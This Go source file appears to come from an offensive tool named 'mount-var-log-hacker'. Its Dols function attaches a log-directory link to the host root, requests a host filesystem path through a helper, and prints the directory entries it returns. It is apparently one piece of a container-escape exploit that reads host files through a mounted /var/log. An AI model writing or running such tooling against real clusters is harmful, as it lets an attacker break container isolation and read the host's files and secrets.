package logls

import (
	"fmt"

	"github.com/PuerkitoBio/goquery"
	"github.com/awslshadowstar/mount-var-log-hacker/pkg/logutil"
)

func DolsWrapper(path string) error {
	ret, err := Dols(path)
	if err != nil {
		return err
	}
	for _, data := range ret {
		fmt.Println(data)
	}
	return nil
}

func Dols(path string) (ret []string, err error) {
	logutil.AttachToRoot()
	defer logutil.DetachFromRoot()

	respbody, err := logutil.DoRequest(logutil.HOST_FS_BASE + path)
	if err != nil {
		return nil, err
	}
	defer respbody.Close()

	doc, err := goquery.NewDocumentFromReader(respbody)
	if err != nil {
		return nil, err
	}

	doc.Find("a").Each(func(i int, s *goquery.Selection) {
		href, exists := s.Attr("href")
		if exists {
			ret = append(ret, href)
		}
	})
	return
}
